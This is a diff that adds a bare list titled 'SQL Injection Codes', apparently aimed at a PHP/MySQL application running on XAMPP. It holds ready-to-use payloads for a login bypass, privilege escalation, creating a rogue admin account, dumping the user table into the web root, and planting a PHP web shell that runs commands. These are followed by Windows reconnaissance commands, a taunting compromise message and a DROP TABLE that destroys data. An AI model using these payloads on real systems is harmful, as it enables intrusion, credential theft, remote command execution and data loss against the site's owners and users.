@@ -1,0 +1,28 @@
+SQL Injection Codes
+
+
+' OR 1='1
+
+
+'); update userlist set Priviledge=1 where ( Username='userXYZ
+
+
+');INSERT INTO userlist (Username, Password, Priviledge) VALUES ('hacker','lulz','1
+'); --
+
+
+SELECT @@datadir
+'); SELECT * FROM userlist INTO OUTFILE 'C:\\xampp\\htdocs\\users.txt'; --
+
+
+'); SELECT '<?php echo exec($_GET[''cmd'']); ?>' AS '' INTO DUMPFILE 'C:\\xampp\\htdocs\\shell.php'; --
+
+'); SELECT '<?php echo "<pre>".shell_exec($_GET[''cmd''])."</pre>"; ?>' AS '' INTO DUMPFILE 'C:\\xampp\\htdocs\\shell.php'; --
+
+whoami
+ipconfig
+ping 10.215.44.11
+START /MAX cmd.exe /K echo This server is now completely compromised. Have a nice day. :)
+
+	
+'); DROP TABLE userlist; --
